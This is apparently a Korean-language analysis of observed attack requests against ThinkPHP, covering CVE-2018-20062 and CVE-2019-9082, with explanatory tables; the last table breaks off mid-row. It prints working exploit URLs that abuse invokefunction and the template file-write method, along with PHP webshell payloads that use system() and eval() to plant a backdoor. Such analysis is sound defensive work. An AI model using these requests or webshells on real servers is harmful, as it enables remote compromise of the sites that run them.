> β… **CVE-2018-20062**
μ΄λ” **ThinkPHP ν”„λ μ„μ›ν¬μ μ‹¬κ°ν• μ›κ²© μ½”λ“ μ‹¤ν–‰ μ·¨μ•½μ (RCE)** μ„ μ΄μ©ν• κ³µκ²©μ…λ‹λ‹¤.
ν•΄λ‹Ή μ·¨μ•½μ μ€ HTTP Requestλ¥Ό μ²λ¦¬ν•κΈ° μ„ν•΄ controllerλ¥Ό νΈμ¶ν•  λ•,
library/think/ μ—μ„ μ‚¬μ©μ μ…λ ¥κ°’μ„ μ μ ν•κ² κ²€μ¦ν•μ§€ μ•μ•„μ„ κ³µκ²©μκ°€ "" κΈ°νΈλ¥Ό μ‚¬μ©ν•μ—¬ class methodλ¥Ό νΈμ¶ν•μ—¬ κ³µκ²©ν•©λ‹λ‹¤.


### π“ PoC κµ¬μ΅° 

```http
GET /index.php?s=/index/\think\app/invokefunction
    &function=call_user_func_array
    &vars[0]=phpinfo
    &vars[1][]=1
```

νΉμ€

```http
&vars[0]=file_put_contents
&vars[1][]=shell.php
&vars[1][]=<?php system($_GET['cmd']); ?>
```

## π¨ κ³µκ²© μΏΌλ¦¬ λ¶„μ„ 1

```plaintext
/index/\think\app/invokefunction
&function=call_user_func_array
&vars[0]=file_put_contents
&vars[1][]=baker.php
&vars[1][]=<?php class GcE493F6 { public function __construct($Hy5F7){ @eval("/*ZBc6469V18*/".$Hy5F7.""); }}new GcE493F6($_REQUEST['pass']);echo error303?>
```

### π” μ£Όμ” κµ¬μ„±μ”μ†:

| νλΌλ―Έν„°                            | μλ―Έ                                            |
| ------------------------------- | --------------------------------------------- |
| `function=call_user_func_array` | PHPμ μ½λ°± ν•¨μ νΈμ¶ (ThinkPHP κ°™μ€ ν”„λ μ„μ›ν¬μ—μ„ μ°ν μ‹¤ν–‰μ— μ‚¬μ©) |
| `vars[0]=file_put_contents`     | νμΌμ„ μ“°κΈ° μ„ν• PHP ν•¨μ μ§€μ •                           |
| `vars[1][]=baker.php`           | μ—…λ΅λ“ν•  νμΌ μ΄λ¦„ (`baker.php`)                      |
| `vars[1][]=...`                 | νμΌ λ‚΄μ© β€“ **μ›Ήμ‰ μ½”λ“ ν¬ν•¨**                          |

---

## π§¨ ν¬ν•¨λ μ•…μ„± μ½”λ“ baker.php (μ›Ήμ‰)

### λ””μ½”λ”©λ μ›Ήμ‰ μ½”λ“:

```php
<?php
class GcE493F6 {
    public function __construct($Hy5F7){
        @eval("/*ZBc6469V18*/" . $Hy5F7 . "");
    }
}
new GcE493F6($_REQUEST['pass']);
echo error303;
?>
```

### κΈ°λ¥ μ”μ•½:

* `$_REQUEST['pass']` νλΌλ―Έν„°λ΅ μ „λ‹¬λ μ½”λ“λ¥Ό `eval()`λ΅ μ‹¤ν–‰
* PHP νμΌ `baker.php`λ΅ μ €μ¥λ¨
* μ™Έλ¶€μ—μ„ λ…λ Ήμ–΄λ¥Ό μ‹¤ν–‰ κ°€λ¥ν• **λ°±λ„μ–΄ μ›Ήμ‰**μ΄ μƒμ„±λ¨
* `echo error303`λ” λ‹¨μ μ‘λ‹µ ν™•μΈμ© (κ³µκ²©μκ°€ μ”μ²­ μ„±κ³µ μ—¬λ¶€ ν™•μΈν•λ” λ°©μ‹)

---

### π” μ”μ•½

| ν•­λ©          | μ„¤λ…                                                                                 |
| ----------- | ---------------------------------------------------------------------------------- |
| **μ·¨μ•½μ  ID**  | CVE-2018-20062                                                                     |
| **μν–¥λ°›λ” λ²„μ „** | ThinkPHP 5.0.23 μ΄ν• λ²„μ „                                                              |
| **μ·¨μ•½μ  μΆ…λ¥**  | μ›κ²© μ½”λ“ μ‹¤ν–‰ (RCE)                                                                     |
| **κ³µκ²© μ›μΈ**   | `invokeFunction` μ—”λ“ν¬μΈνΈκ°€ `call_user_func_array()`λ¥Ό ν•„ν„° μ—†μ΄ νΈμ¶ κ°€λ¥                      |
| **κ³µκ²© λ°©μ‹**   | `function`κ³Ό `vars[]` νλΌλ―Έν„°λ¥Ό ν†µν•΄ **μ„μμ PHP ν•¨μ νΈμ¶ κ°€λ¥**, μ: `eval`, `file_put_contents` |
| **κ³µκ²© κ²°κ³Ό**   | μ›κ²©μ—μ„ PHP μ›Ήμ‰ μ—…λ΅λ“ λ° λ…λ Ή μ‹¤ν–‰ κ°€λ¥                                                         |

---

## π“ κ³µκ²© μΏΌλ¦¬ λ¶„μ„ 2

```plaintext
s=index/\think\template\driver\file/write
&cacheFile=baker.php
&content=<?php class GcE493F6 { public function __construct($Hy5F7){ @eval("/*ZBc6469V18*/".$Hy5F7.""); }}new GcE493F6($_REQUEST['pass']);echo error303;?>
```

### π” μ£Όμ” κµ¬μ„±μ”μ†:

| νλΌλ―Έν„°                                        | μ„¤λ…                                        |
| ------------------------------------------- | ----------------------------------------- |
| `s=index/\think\template\driver\file/write` | ThinkPHP λ‚΄λ¶€ ν΄λμ¤ κ²½λ΅λ¥Ό μ΄μ©ν•΄ `write` λ©”μ„λ“ μ§μ ‘ νΈμ¶ |
| `cacheFile=baker.php`                       | μƒμ„±ν•  νμΌ μ΄λ¦„                                 |
| `content=...`                               | PHP μ›Ήμ‰ μ½”λ“ λ‚΄μ© μΈμ½”λ”©λμ–΄ ν¬ν•¨                     |

---

## π’£ μ΄ κ³µκ²©μ ν•µμ‹¬

* ThinkPHPμ `think\template\driver\file::write()` λ©”μ„λ“λ¥Ό **μ§μ ‘ νΈμ¶**ν•μ—¬ μ›Ήμ‰ νμΌμ„ μ”λ‹λ‹¤.
* κ³µκ²©μλ” URL νλΌλ―Έν„°λ¥Ό ν†µν•΄ νμΌ μ΄λ¦„κ³Ό λ‚΄μ©μ„ μ§€μ • β†’ **μ§μ ‘ μ›Ήμ‰ μƒμ„± κ°€λ¥**
* μ—…λ΅λ“λ `baker.php`λ” λ‹¤μκ³Ό κ°™μ€ PHP λ°±λ„μ–΄λ¥Ό ν¬ν•¨:

```php
<?php
class GcE493F6 {
    public function __construct($Hy5F7){
        @eval("/*ZBc6469V18*/" . $Hy5F7 . "");
    }
}
new GcE493F6($_REQUEST['pass']);
echo error303;
?>
```
---

### π” μ”μ•½

| ν•­λ©          | λ‚΄μ©                                        |
| ----------- | ----------------------------------------- |
| **CVE ID**  | CVE-2019-9082                             |
| **μν–¥λ°›λ” λ²„μ „** | ThinkPHP 5.x (νΉν 5.0.23 μ΄ν•)               |
| **μ·¨μ•½μ  μΆ…λ¥**  | RCE (Remote Code Execution)               |
| **μ·¨μ•½μ  μ„μΉ**  | `think\template\driver\file::write()` λ©”μ„λ“ |
| **μ·¨μ•½ μ›μΈ**   | μ™Έλ¶€ μ…λ ¥μΌλ΅ ν•΄λ‹Ή λ©”μ„λ“                            |

